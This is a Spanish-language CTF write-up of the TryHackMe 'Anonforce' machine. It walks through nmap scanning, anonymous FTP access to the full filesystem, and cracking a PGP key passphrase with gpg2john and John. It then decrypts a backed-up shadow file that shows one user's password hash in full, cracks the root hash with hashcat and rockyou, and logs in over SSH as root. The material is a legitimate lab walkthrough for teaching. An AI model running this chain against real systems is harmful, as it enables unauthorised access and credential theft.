---
layout: single
title: Anonforce
excerpt: "boot2root machine for FIT and bsides guatemala CTF"
date: 2022-04-25
classes: wide
header:
  teaser: /assets/images/thm-writeup-anonforce/anonforce_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - John
  - Hash
  - FTP
  - SSH
---

![logo](/assets/images/thm-writeup-anonforce/anonforce_logo.png)

 [Link](https://tryhackme.com/room/bsidesgtanonforce "jason")

boot2root machine for FIT and bsides guatemala CTF. Read user.txt and root.txt

---

## 1. Fase de reconocimiento

- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:

~~~css
ping -c 1 {ip}
~~~

![ping](/assets/images/thm-writeup-anonforce/anonforce_ping.png)

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

- Whatweb nos da la siguiente información que nos indica que no hay una página http:

~~~css
whatweb {ip}
~~~

![whatweb](/assets/images/thm-writeup-anonforce/anonforce_whatweb.png)

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los ***65535*** puerto de red con el siguiente comando:
  
~~~css
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
~~~

![nmap](/assets/images/thm-writeup-anonforce/anonforce_nmap.png)

## 2.1 FTP

- Conexión al protocolo FTP con el usuario anonymous:
  
~~~css
└─$ ftp anonymous@10.10.24.236
Connected to 10.10.24.236.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30541|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Apr 25 16:34 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   92 0        0               0 Apr 25 16:34 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Apr 25 16:34 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Apr 25 16:34 sys
drwxrwxrwt    9 0        0            4096 Apr 25 16:34 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
~~~

## 3 Bandera de usuario

- Accedemos a la carpeta **home** y dentro de esta a la carpeta **melodias**, dentro de esta última encotramos el archivo **user.txt**, el cual procedemos a descargar con el comando **get** como se observa a continuación:

~~~css
ftp> cd home
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||43856|)
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||7973|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||42302|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |******************************************************|    33      575.47 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.18 KiB/s) 
~~~

- Revisando encontramos una carpeta con el siguiente nombre muy llamativo: **notread**, procedemos a descargar su contenido como se oberva a continuación:
  
~~~css
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||13508|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||64112|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |******************************************************|   524        9.79 MiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (3.06 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||30631|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |******************************************************|  3762       59.79 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (21.99 KiB/s)
~~~

- Análizando los archivos descargados, en el **user.txt** encontramos la bandera de usuario:
  
![user_flag](/assets/images/thm-writeup-anonforce/anonforce_user.png)

---

## 4 Bandera root

- Analizando el archivo **private.asc** nos encotramos una llave privada:

![key](/assets/images/thm-writeup-anonforce/anonforce_key.png)

## 4.1 Extraer hashes de archivos encriptados con GnuPGP

## 4.1.1 gpg2john

- Utilizando **gpg2john** convertimos las llaves en un formato que JTR(john the ripper) pueda entender, en ese entendido utilizamos este comando como se observa a continuación:

- Convertir ***backup.gpg***:
  
~~~css
└─# gpg2john backup.pgp > back

File backup.pgp
Encrypted data [sym alg is specified in pub-key encrypted session key]
SYM_ALG_MODE_PUB_ENC is not supported yet!
~~~

- Convertir ***private.asc***:
  
~~~css
└─# gpg2john private.asc > private

File private.asc
~~~

---

## 4.1.2 john private

- Desciframos el archivo recien creado ***private*** con el sighiente comando:

~~~css
└─# john private                                                   
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 16 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
x????          (anonforce)     
1g 0:00:00:00 DONE 2/3 (2022-04-25 19:56) 9.090g/s 144454p/s 144454c/s 144454C/s marisol..sweetness
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

- Importamos la llave privada ***private.asc***

~~~css
└─# gpg --import private.asc      
gpg: clave B92CD1F280AD82C2: clave pública "anonforce <melodias@anonforce.nsa>" importada
gpg: clave B92CD1F280AD82C2: clave secreta importada
gpg: clave B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" sin cambios
gpg: Cantidad total procesada: 2
gpg:               importadas: 1
gpg:              sin cambios: 1
gpg:       claves secretas leídas: 1
gpg:   claves secretas importadas: 1
~~~

- Desciframos el contenido del archivo ***backup.pgp***, con este paso podemos ver el hash de la cueta ***root***

~~~css
└─# gpg --decrypt backup.pgp 
~~~

- Se carga la siguiente ventana en la que digitamos la contraseña encontrada en el punto **4.1.2**

![key](/assets/images/thm-writeup-anonforce/anonforce_gpg1.png)

- A continuación se ve el contenido del archivo:
  
~~~css
gpg: NOTA: el cifrado CAST5 no aparece en las preferencias del receptor
gpg: cifrado con clave de 512 bits ELG, ID AA6268D1E6612967, creada el 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$0??????????????????????????????????????????????????????????????????????:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::                                               
~~~

- Creaamos un archivo con el hash del usuario **root**, en nuestro caso lo nombramos **hash**.

![hash_id](/assets/images/thm-writeup-anonforce/anonforce_hash1.png)

- Procedemos a analizar la cabecera del hash en la siguiente página: <https://hashcat.net/wiki/doku.php?id=example_hashes> en la que se evidencia que el identificador del hash es: **1800**

![hash_id](/assets/images/thm-writeup-anonforce/anonforce_hash_id.png)

## 4.1.3 hashcat

- Con la información anterior y usando **hashcat** procedemos a descifrar la contraseña para ingresar vís SSH:

~~~css
hashcat -m 1800 hash --force --wordlist /usr/share/wordlists/rockyou.txt
~~~

![hash_id](/assets/images/thm-writeup-anonforce/anonforce_hash2.png)

## 4.1.4 Conexión vía ssh

~~~css
ssh root@10.10.24.236
~~~

![root](/assets/images/thm-writeup-anonforce/anonforce_root.png)

---

Fuentes:

- Recover Your GPG Passphrase using 'John the Ripper': <https://www.ubuntuvibes.com/2012/10/recover-your-gpg-passphrase-using-john.html>

- Generic hash types: <https://hashcat.net/wiki/doku.php?id=example_hashes>
